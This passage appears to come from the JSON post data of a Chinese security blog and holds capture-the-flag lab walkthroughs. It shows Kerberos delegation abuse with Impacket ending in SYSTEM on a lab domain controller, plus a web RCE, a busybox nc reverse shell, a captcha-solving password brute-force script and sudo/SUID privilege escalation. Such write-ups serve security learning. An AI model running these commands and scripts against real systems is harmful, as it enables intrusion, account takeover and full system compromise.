(S-1-5-21-3649830887-1815587496-1699028491-2601)\n```\n\n\u8f93\u51fa\u786e\u8ba4\u59d4\u6d3e\u6743\u9650\u5df2\u6210\u529f\u4fee\u6539\uff0c`NEWPC$` \u73b0\u5728\u53ef\u4ee5\u6a21\u62df\u7528\u6237\u5728 `DC$` \u4e0a\u8fdb\u884c\u64cd\u4f5c\u4e86\u3002\n\n## **3.4 Kerberos\u59d4\u6d3e\u653b\u51fb (S4U2proxy)**\n\n\u73b0\u5728\uff0c\u653b\u51fb\u6d41\u7a0b\u8fdb\u5165\u6700\u540e\u9636\u6bb5\u3002\n\n1. **\u83b7\u53d6 `NEWPC$` \u7684 TGT**\n   \u9996\u5148\uff0c\u4f7f\u7528 `getTGT.py` \u548c\u6211\u4eec\u4e3a `NEWPC$` \u8bbe\u7f6e\u7684\u5bc6\u7801\uff0c\u83b7\u53d6\u5176Kerberos TGT\uff08\u7968\u636e\u6388\u4e88\u7968\u636e\uff09\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip 192.168.205.132 novice.com/NEWPC$:Password123!\n   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n   \n   [*] Saving ticket in NEWPC$.ccache\n   ```\n\n2. **\u8bf7\u6c42\u6a21\u62df\u7ba1\u7406\u5458\u7684\u670d\u52a1\u7968\u636e**\n   \u63a5\u4e0b\u6765\uff0c\u5229\u7528\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684 TGT\uff0c\u901a\u8fc7 Kerberos S4U2proxy \u6269\u5c55\u534f\u8bae\uff0c\u8bf7\u6c42\u4e00\u5f20\u53ef\u4ee5**\u6a21\u62df `Administrator` \u7528\u6237**\u8eab\u4efd\u3001\u5e76\u7528\u4e8e\u8bbf\u95ee\u57df\u63a7 `cifs`\uff08\u6587\u4ef6\u5171\u4eab\uff09\u670d\u52a1\u7684\u670d\u52a1\u7968\u636e (ST)\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ export KRB5CCNAME=NEWPC$.ccache\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/getST.py -k -no-pass -spn cifs/dc.novice.com -impersonate Administrator -dc-ip 192.168.205.132 novice.com/NEWPC$       \n   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n   \n   [*] Impersonating Administrator\n   [*] Requesting S4U2self\n   [*] Requesting S4U2Proxy\n   [*] Saving ticket in Administrator@cifs_dc.novice.com@NOVICE.COM.ccache\n   ```\n\n   \u653b\u51fb\u6210\u529f\uff0c\u6211\u4eec\u83b7\u53d6\u4e86\u5305\u542b\u7ba1\u7406\u5458\u6743\u9650\u7684\u670d\u52a1\u7968\u636e\uff0c\u5e76\u4fdd\u5b58\u5728\u4e00\u4e2a\u65b0\u7684 `.ccache` \u51ed\u8bc1\u7f13\u5b58\u6587\u4ef6\u4e2d\u3002\n\n---\n\n# **\u56db\u3001\u593a\u53d6\u57df\u63a7\u4e0e\u603b\u7ed3**\n\n## **4.1 \u89e3\u51b3\u540d\u79f0\u89e3\u6790\u95ee\u9898**\n\n\u5728\u76f4\u63a5\u4f7f\u7528\u6700\u7ec8\u7968\u636e\u8fdb\u884c\u653b\u51fb\u65f6\uff0c\u6211\u4eec\u7684\u653b\u51fb\u673a\u53ef\u80fd\u56e0\u4e3a\u65e0\u6cd5\u5c06\u57df\u540d `dc.novice.com` \u548c `novice.com` \u89e3\u6790\u5230\u6b63\u786e\u7684IP\u5730\u5740\u800c\u5bfc\u81f4\u8fde\u63a5\u5931\u8d25\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u9700\u8981\u5c06\u57df\u540d\u548cIP\u7684\u5bf9\u5e94\u5173\u7cfb\u624b\u52a8\u5199\u5165\u672c\u5730\u7684 `/etc/hosts` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo nano /etc/hosts\n[sudo] kali \u7684\u5bc6\u7801\uff1a\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts                                  \n192.168.205.132 novice.com dc.novice.com DC\n```\n\n\u6dfb\u52a0\u6b64\u6761\u76ee\u540e\uff0c\u6240\u6709\u76f8\u5173\u7684\u57df\u540d\u90fd\u5c06\u6b63\u786e\u6307\u5411\u76ee\u6807IP\u3002\n\n## **4.2 \u6700\u7ec8\u653b\u51fb**\n\n1. **\u52a0\u8f7d\u6700\u7ec8\u7968\u636e**\n   \u9996\u5148\uff0c\u66f4\u65b0 `KRB5CCNAME` \u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u5176\u6307\u5411\u521a\u521a\u83b7\u53d6\u7684\u3001\u5305\u542b\u7ba1\u7406\u5458\u6743\u9650\u7684\u65b0\u7968\u636e\u6587\u4ef6\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ export KRB5CCNAME=Administrator@cifs_dc.novice.com@NOVICE.COM.ccache\n   ```\n\n2. **\u6267\u884c `psexec.py` \u83b7\u53d6SYSTEM\u6743\u9650**\n   \u6700\u540e\uff0c\u4f7f\u7528 `psexec.py` \u548c\u5df2\u52a0\u8f7d\u7684\u7ba1\u7406\u5458\u7968\u636e\uff0c\u5728\u57df\u63a7\u5236\u5668\u4e0a\u6267\u884c\u547d\u4ee4\u3002\u8be5\u5de5\u5177\u5c06\u5229\u7528\u7968\u636e\u8fdb\u884c\u8ba4\u8bc1\uff0c\u5e76\u5728\u76ee\u6807\u4e0a\u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u6765\u53cd\u5f39\u4e00\u4e2a\u4ea4\u4e92\u5f0fShell\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.novice.com\n   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n   \n   [*] Requesting shares on dc.novice.com.....\n   [*] Found writable share ADMIN$\n   [*] Uploading file ACAXTjTE.exe\n   [*] Opening SVCManager on dc.novice.com.....\n   [*] Creating service ELXu on dc.novice.com.....\n   [*] Starting service ELXu.....\n   [!] Press help for extra shell commands\n   [-] Decoding error detected, consider running chcp.com at the target,\n   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings\n   and then execute smbexec.py again with -codec and the corresponding codec\n   Microsoft Windows [\ufffd\u6c7e 10.0.20348.169]\n   \n   [-] Decoding error detected, consider running chcp.com at the target,\n   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings\n   and then execute smbexec.py again with -codec and the corresponding codec\n   (c) Microsoft Corporation\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd\n   \n   C:\\Windows\\system32> whoami\n   nt authority\\system\n   ```\n\n`whoami` \u547d\u4ee4\u7684\u8fd4\u56de\u7ed3\u679c\u786e\u8ba4\u4e3a `nt authority\\system`\uff0c\u8fd9\u8868\u660e\u6211\u4eec\u5df2\u6210\u529f\u83b7\u5f97\u57df\u63a7\u5236\u5668\u7684\u6700\u9ad8\u7cfb\u7edf\u6743\u9650\u3002\u81f3\u6b64\uff0c\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u5706\u6ee1\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1755922208, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-23", "dateLabelColor": "#0969da"}, "P228": {"htmlDir": "docs/post/nei-bu-_Griffin.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Griffin", "postUrl": "post/nei-bu-_Griffin.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/228", "commentNum": 0, "wordCount": 10477, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u4f7f\u7528`arp-scan`\u5de5\u5177\u5bf9\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u5b9a\u76ee\u6807IP\u5730\u5740\u4e3a `192.168.205.132`\u3002\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528`nmap`\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u7aef\u53e3\u548c\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.132\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT\nNmap scan report for novice.com (192.168.205.132)\nHost is up (0.00038s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.10 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86`22`\u7aef\u53e3\uff08SSH\u670d\u52a1\uff09\u548c`8080`\u7aef\u53e3\uff08HTTP\u4ee3\u7406\u670d\u52a1\uff09\u3002\n\n# **\u4e8c\u3001Web\u6e17\u900f\u4e0e\u6f0f\u6d1e\u5229\u7528**\n\n## **2.1 Web\u76ee\u5f55\u63a2\u6d4b**\n\n\u8bbf\u95ee`http://192.168.205.132:8080/`\uff0c\u9875\u9762\u663e\u793a\u6b22\u8fce\u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.132:8080/\nYo, welcome to GriffinCorp, the coolest company in Quahog!\nPeter Griffin\u2019s got your back with top-notch service.\nDon\u2019t mess this up, or Lois is gonna be pissed!\n```\n\n\u4f7f\u7528`dirsearch`\u5de5\u5177\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u53d1\u73b0\u4e86`/info`\u548c`/debug`\u4e24\u4e2a\u8def\u5f84\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.132:8080\n...\n[09:28:14] 403 -   23B  - /debug\n[09:28:18] 200 -   49B  - /info\n...\n```\n\n## **2.2 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09**\n\n\u8bbf\u95ee`/info`\u8def\u5f84\uff0c\u53d1\u73b0\u5b83\u4f1a\u8fd4\u56de\u4e00\u4e2a\u8bca\u65ad\u4ee4\u724c\u3002\u591a\u6b21\u8bbf\u95ee\u540e\u53d1\u73b0\uff0c\u8be5\u4ee4\u724c\u662f\u968f\u673a\u53d8\u5316\u7684\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.132:8080/info\nSystem Info: Diagnostic token = BetaToken123\n...\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.132:8080/info\nSystem Info: Diagnostic token = CyberCorpDebug123\n```\n\n\u8bbf\u95ee`/debug`\u8def\u5f84\u63d0\u793a\u7f3a\u5c11`token`\u53c2\u6570\u3002\u5c1d\u8bd5\u5c06\u4ece`/info`\u83b7\u53d6\u7684\u4ee4\u724c\u4f5c\u4e3a\u53c2\u6570\u63d0\u4f9b\uff0c\u9875\u9762\u63d0\u793a\u7f3a\u5c11`run`\u547d\u4ee4\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'\nMissing run command\n```\n\n\u8fd9\u8868\u660e\u8be5\u7aef\u70b9\u53ef\u80fd\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u901a\u8fc7`run`\u53c2\u6570\u4f20\u9012`id`\u547d\u4ee4\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6210\u529f\u6267\u884c\u5e76\u8fd4\u56de\u4e86\u7ed3\u679c\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=id'\nuid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)\n```\n\n**\u6ce8\u610f**\uff1a\u7531\u4e8e\u4ee4\u724c\u662f\u968f\u673a\u7684\uff0c\u9700\u8981\u5148\u8bbf\u95ee`/info`\u83b7\u53d6\u6709\u6548\u4ee4\u724c\uff0c\u518d\u7acb\u5373\u7528\u4e8e`/debug`\u7aef\u70b9\u3002\n\n## **2.3 \u83b7\u53d6\u53cd\u5411Shell**\n\n\u5728Kali\u4e0a\u8bbe\u7f6e`netcat`\u76d1\u542c8888\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n\u5229\u7528\u5df2\u53d1\u73b0\u7684RCE\u6f0f\u6d1e\uff0c\u6267\u884c\u4e00\u4e2a\u53cd\u5411shell\u547d\u4ee4\u3002\u8fd9\u91cc\u4f7f\u7528`busybox nc`\u6765\u5efa\u7acb\u8fde\u63a5\u3002\n\n```bash\nhttp://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash\n```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5411shell\uff0c\u5f53\u524d\u7528\u6237\u4e3a`lois`\u3002\n\n```bash\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526\nid\nuid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)\n```\n\n\u968f\u540e\uff0c\u901a\u8fc7\u4e00\u7cfb\u5217\u547d\u4ee4\u5c06\u7b80\u6613shell\u5347\u7ea7\u4e3a\u529f\u80fd\u5b8c\u5584\u7684\u4ea4\u4e92\u5f0fTTY\u3002\n\n```bash\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 36 columns 178\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **3.1 \u672c\u5730\u679a\u4e3e**\n\n\u83b7\u53d6`user.txt`\u4e2d\u7684\u7b2c\u4e00\u4e2aflag\u3002\n\n```bash\nlois@Griffin:/home/lois$ cat user.txt\nflag{user-f6b63474e7cc20b0893a82beb9e3b3fd}\n```\n\n\u4f7f\u7528`sudo -l`\u68c0\u67e5`lois`\u7528\u6237\u7684sudo\u6743\u9650\u3002\n\n```bash\nlois@Griffin:/home/lois$ sudo -l\n...\nUser lois may run the following commands on Griffin:\n    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log\n```\n\n`lois`\u53ef\u4ee5\u514d\u5bc6\u4f7f\u7528`cat`\u547d\u4ee4\u8bfb\u53d6`/root/startup.log`\u3002\u68c0\u67e5\u7f51\u7edc\u8fde\u63a5\u60c5\u51b5\uff0c\u53d1\u73b0\u9664\u4e86\u516c\u7f51\u7684`8080`\u548c`22`\u7aef\u53e3\u5916\uff0c\u8fd8\u5728\u672c\u5730`127.0.0.1`\u4e0a\u76d1\u542c\u4e86\u591a\u4e2a\u7aef\u53e3\uff0c\u5305\u62ec\u4e00\u4e2a`80`\u7aef\u53e3\u3002\n\n```bash\nlois@Griffin:/opt$ ss -tnlp\nState                   Recv-Q                  Send-Q               Local Address:Port\n...\nLISTEN                  0                       5                          0.0.0.0:8080\nLISTEN                  0                       128                        127.0.0.1:80\n...\n```\n\n## **3.2 \u7aef\u53e3\u8f6c\u53d1\u4e0eWeb\u4e8c\u6b21\u6e17\u900f**\n\n\u7531\u4e8e`80`\u7aef\u53e3\u53ea\u5728\u672c\u5730\u76d1\u542c\uff0c\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u3002\u4f7f\u7528`socat`\u5c06\u672c\u5730\u7684`80`\u7aef\u53e3\u8f6c\u53d1\u5230`8000`\u7aef\u53e3\uff0c\u4ee5\u4fbf\u4ece\u5916\u90e8\u8bbf\u95ee\u3002\n\n```bash\nlois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &\n```\n\n\u8bbf\u95ee\u8f6c\u53d1\u540e\u7684`http://192.168.205.132:8000/`\uff0c\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e'Family Guy'\u7684\u7f51\u7ad9\u3002\u518d\u6b21\u4f7f\u7528`dirsearch`\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u53d1\u73b0`robots.txt`\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.132:8000/robots.txt\nUser-agent: *\nDisallow: /family\n\n...\n\nrockyou: world's best dictionary, hands down!\n```\n\n`robots.txt`\u7981\u6b62\u8bbf\u95ee`/family`\u8def\u5f84\uff0c\u5e76\u6697\u793a`rockyou`\u5b57\u5178\u53ef\u80fd\u4f1a\u6d3e\u4e0a\u7528\u573a\u3002\n\n## **3.3 \u767b\u5f55\u7206\u7834 (lois -> meg)**\n\n\u8bbf\u95ee`/family`\u8def\u5f84\u662f\u4e00\u4e2a\u767b\u5f55\u9875\u9762\uff0c\u5305\u542b\u7528\u6237\u540d\u3001\u5bc6\u7801\u548c\u9a8c\u8bc1\u7801\u3002\u9875\u9762\u63d0\u793a`brian`\u7528\u6237\u6bcf5\u6b21\u5c1d\u8bd5\u540e\u4f1a\u88ab\u9501\u5b9a\uff0c\u9700\u8981\u91cd\u7f6e\u3002\n\n\u4e3a\u6b64\uff0c\u7f16\u5199\u4e86\u4e00\u4e2aPython\u811a\u672c\uff0c\u4f7f\u7528`ddddocr`\u5e93\u8bc6\u522b\u9a8c\u8bc1\u7801\uff0c\u5e76\u7ed3\u5408\u5b57\u5178\u5bf9`brian`\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u7206\u7834\u3002\u811a\u672c\u903b\u8f91\u5305\u62ec\u81ea\u52a8\u8bc6\u522b\u9a8c\u8bc1\u7801\u3001\u5904\u7406\u8d26\u6237\u9501\u5b9a\u4ee5\u53ca\u591a\u7ebf\u7a0b\u7206\u7834\u3002\n\n```python\nimport requests\nimport ddddocr\nfrom concurrent.futures import ThreadPoolExecutor\nfrom threading import Lock\nimport queue\n\nurl = 'http://192.168.205.132:8000/family/'\ncap_url = 'http://192.168.205.132:8000/family/captcha.php'\nrst_url = 'http://192.168.205.132:8000/family/?reset=1'\nuser = 'brian'\ndict_file = '5000q.txt'\nmax_workers = 2\n\nocr = ddddocr.DdddOcr()\npw_q = queue.Queue()\nfound = queue.Queue(maxsize=1)\npr_lock = Lock()\ntotal = 0\nMAX_RETRY = 3   # \u6bcf\u4e2a\u5bc6\u7801\u6700\u591a\u91cd\u8bd5 3 \u6b21\n\n\ndef worker():\n    global total\n    s = requests.Session()\n    s.headers.update({\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',\n        'Accept': 'text/html,*/*',\n        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.2',\n        'Connection': 'keep-alive',\n        'Referer': url,\n        'Upgrade-Insecure-Requests': '1'\n    })\n\n    tries = 0\n    while True:\n        if not found.empty():\n            return\n        try:\n            pw, retry = pw_q.get_nowait()\n            tries += 1\n\n            cap_img = s.get(cap_url, timeout=5).content\n            cap = ocr.classification(cap_img).strip()\n\n            if len(cap) != 4:\n                if retry < MAX_RETRY:\n                    pw_q.put((pw, retry + 1))\n                continue\n\n            r = s.post(url, data={'username': user, 'password': pw, 'captcha': cap}, timeout=5)\n\n            with pr_lock:\n                total += 1\n                n = total\n\n            res = r.text\n\n            # \u8d26\u53f7\u88ab\u9501\u5b9a\n            if 'ACCOUNT TEMPORARILY LOCKED!' in res:\n                with pr_lock:\n                    print(f'[{n:4d}] \ud83d\udeab {pw:<12} | \ud83d\udd24 {cap} | \u539f\u56e0: \u8d26\u53f7\u88ab\u9501\u5b9a \u2192 reset')\n                try:\n                    s.get(rst_url, timeout=5)\n                except requests.RequestException:\n                    pass\n                if retry < MAX_RETRY:\n                    pw_q.put((pw, retry + 1))\n                continue\n\n            # \u7834\u89e3\u6210\u529f\n            if 'Invalid security code!' not in res and 'Incorrect password!' not in res:\n                found.put((user, pw, cap, n))\n                with pr_lock:\n                    print(f'\\n[+] \ud83c\udf89 \u7834\u89e3\u6210\u529f\uff01\ud83c\udf89\\n    \u7528\u6237\u540d: {user}\\n    \u5bc6\u7801: {pw}\\n    \u9a8c\u8bc1\u7801: {cap}\\n    \u5c1d\u8bd5: {n}')\n                return\n\n            # \u5931\u8d25\u539f\u56e0\u8f93\u51fa\n            reason = '\u672a\u77e5\u539f\u56e0'\n            if 'Invalid security code!' in res:\n                reason = '\u9a8c\u8bc1\u7801\u9519\u8bef'\n            elif 'Incorrect password!' in res:\n                reason = '\u5bc6\u7801\u9519\u8bef'\n\n            with pr_lock:\n                print(f'[{n:4d}] \u274c {pw:<12} | \ud83d\udd24 {cap} | \u539f\u56e0: {reason}')\n\n        except queue.Empty:\n            break\n        except requests.RequestException:\n            if retry < MAX_RETRY:\n                pw_q.put((pw, retry + 1))\n        except Exception as e:\n            with pr_lock:\n                print(f'[!] \u7ebf\u7a0b\u5f02\u5e38: {e}')\n\n\nif __name__ == '__main__':\n    try:\n        with open(dict_file, encoding='utf-8') as f:\n            for p in [x.strip() for x in f if x.strip()]:\n                pw_q.put((p, 0))   # (\u5bc6\u7801, \u91cd\u8bd5\u6b21\u6570)\n    except:\n        print(f'[-] \u5b57\u5178\u672a\u627e\u5230: {dict_file}')\n        exit(1)\n\n    print(f'[*] \u5f00\u59cb\u7206\u7834 | \u7528\u6237: {user} | \u5b57\u5178: {dict_file} | \u603b\u6570: {pw_q.qsize()} | \u7ebf\u7a0b: {max_workers}\\n')\n\n    with ThreadPoolExecutor(max_workers=max_workers) as ex:\n        list(ex.map(lambda _: worker(), range(max_workers)))\n\n    if found.empty():\n        print(f'\\n[-] \u274c \u7206\u7834\u5931\u8d25')\n```\n\n\u7ecf\u8fc7\u7206\u7834\uff0c\u6210\u529f\u83b7\u5f97`brian`\u7528\u6237\u7684\u5bc6\u7801\u3002\n\n```\n[+] \ud83c\udf89 \u7834\u89e3\u6210\u529f\uff01\ud83c\udf89\n    \u7528\u6237\u540d: brian\n    \u5bc6\u7801: savannah\n    \u9a8c\u8bc1\u7801: 8upj\n    \u5c1d\u8bd5: 555\n```\n\n\u4f7f\u7528`brian:savannah`\u767b\u5f55\u540e\uff0c\u5728Cookie\u4e2d\u53d1\u73b0\u4e00\u4e2a`auth_token`\u3002\u7ecf\u8fc7\u5206\u6790\uff0c\u8be5token\u6cc4\u9732\u4e86`meg`\u7528\u6237\u7684\u51ed\u636e\u3002\n\n```\nmeg:lovelyfamily\n```\n\n\u4f7f\u7528`su`\u547d\u4ee4\u548c\u8be5\u5bc6\u7801\u6210\u529f\u5207\u6362\u5230`meg`\u7528\u6237\u3002\n\n```bash\nlois@Griffin:/opt$ su meg\nPassword: lovelyfamily\nmeg@Griffin:~$ id\nuid=1001(meg) gid=1001(meg) groups=1001(meg)\n```\n\n## **3.4 Sudo\u63d0\u6743 (meg -> peter)**\n\n\u68c0\u67e5`meg`\u7528\u6237\u7684sudo\u6743\u9650\u3002\n\n```bash\nmeg@Griffin:~$ sudo -l\n...\nUser meg may run the following commands on Griffin:\n    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py\n```\n\n`meg`\u53ef\u4ee5\u514d\u5bc6\u4ee5root\u6743\u9650\u6267\u884c`/root/game.py`\u811a\u672c\u3002\u6267\u884c\u8be5\u811a\u672c\u540e\uff0c\u5b83\u4f1a\u5728`6666`\u7aef\u53e3\u4e0a\u542f\u52a8\u4e00\u4e2a\u76d1\u542c\u670d\u52a1\u3002\n\n```bash\nmeg@Griffin:~$ sudo /usr/bin/python3 /root/game.py\nServer listening on port 6666...\n```\n\n\u8be5\u670d\u52a1\u8bbe\u8ba1\u4e86\u4e09\u4e2a\u6311\u6218\uff1a\u6570\u5b66\u8ba1\u7b97\u3001\u51ef\u6492\u5bc6\u7801\u89e3\u5bc6\u548cMD5\u54c8\u5e0c\u8ba1\u7b97\uff083s\u65f6\u95f4\u9650\u5236\uff09\uff0c\u6240\u4ee5\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u5ba2\u6237\u7aef\u811a\u672c\u4e0e\u8be5\u670d\u52a1\u8fdb\u884c\u4ea4\u4e92\u3002\n\n```python\nimport socket\nimport re\nimport hashlib\n\ns = socket.socket()\ns.connect(('192.168.205.132', 6666))\n\ndata = s.recv(4096).decode()\nprint(data)\n\nmatch = re.search(r'\\((\\d+) \\* (\\d+)\\) // (\\d+)', data)\na, b, c = map(int, match.groups())\nans1 = str((a * b) // c)\ns.send((ans1 + '\\n').encode())\n\ndata = s.recv(4096).decode()\nprint(data)\ns.send(b'flag{fakeflag}\\n')\n\ndata = s.recv(4096).decode()\nprint(data)\nx = re.search(r'MD5\\((\\d+) \\+ UNIX timestamp: (\\d+)\\)', data)\nparam = x.group(1) + x.group(2)\nmd5_hash = hashlib.md5(param.encode()).hexdigest()\ns.send((md5_hash + '\\n').encode())\n\nprint(s.recv(4096).decode())\ns.close()\n```\n\n\u6210\u529f\u901a\u8fc7\u6240\u6709\u6311\u6218\u540e\uff0c\u670d\u52a1\u8fd4\u56de\u4e86\u4e00\u4e2a\u5bc6\u7801\u3002\n\n```\nCongratulations! Flag: HMV{Wow!VeryFuuuuuny!}\n```\n\n\u8fd9\u4e2a\u5bc6\u7801`Wow!VeryFuuuuuny!`\u5b9e\u9645\u4e0a\u662f`peter`\u7528\u6237\u7684SSH\u5bc6\u7801\u3002\u4f7f\u7528\u8be5\u5bc6\u7801\u6210\u529f\u767b\u5f55`peter`\u8d26\u6237\u3002\n\n```bash\n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh peter@192.168.205.132\npeter@192.168.205.132's password: Wow!VeryFuuuuuny!\n...\npeter@Griffin:~$ id\nuid=1003(peter) gid=1003(peter) groups=1003(peter)\n```\n\n## **3.5 Sudo\u63d0\u6743 (peter -> root)**\n\n\u6700\u540e\uff0c\u68c0\u67e5`peter`\u7528\u6237\u7684sudo\u6743\u9650\u3002\n\n```bash\npeter@Griffin:~$ sudo -l\n...\nUser peter may run the following commands on Griffin:\n    (ALL) NOPASSWD: /usr/bin/mg\n```\n\n`peter`\u53ef\u4ee5\u514d\u5bc6\u4ee5root\u6743\u9650\u8fd0\u884c\u6587\u672c\u7f16\u8f91\u5668`mg`\u3002`mg`\u7f16\u8f91\u5668\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u5916\u90e8shell\u547d\u4ee4\u6765\u8fdb\u884c\u63d0\u6743\u3002\n\n1.  \u521b\u5efa\u4e00\u4e2a\u811a\u672c`/tmp/a`\uff0c\u5185\u5bb9\u4e3a\u7ed9`/bin/bash`\u6dfb\u52a0SUID\u6743\u9650\u4f4d\uff0c\u5e76\u8d4b\u4e88\u5176\u6267\u884c\u6743\u9650\u3002\n\n    ```bash\n    peter@Griffin:~$ echo 'chmod +s /bin/bash' > /tmp/a\n    peter@Griffin:~$ chmod +x /tmp/a\n    ```\n\n2.  \u4ee5sudo\u6743\u9650\u8fd0\u884c`mg`\u3002\n\n    ```bash\n    peter@Griffin:~$ sudo /usr/bin/mg\n    ```\n\n3.  \u5728`mg`\u7f16\u8f91\u5668\u4e2d\uff0c\u6309`Alt-x`\uff0c\u8f93\u5165`shell-command`\u5e76\u6309\u56de\u8f66\u3002\n4.  \u5728\u65b0\u7684\u63d0\u793a\u7b26\u4e0b\uff0c\u8f93\u5165`/tmp/a`\u5e76\u56de\u8f66\uff0c\u6267\u884c\u6211\u4eec\u7684\u811a\u672c\u3002\n5.  \u6309`Ctrl-x` 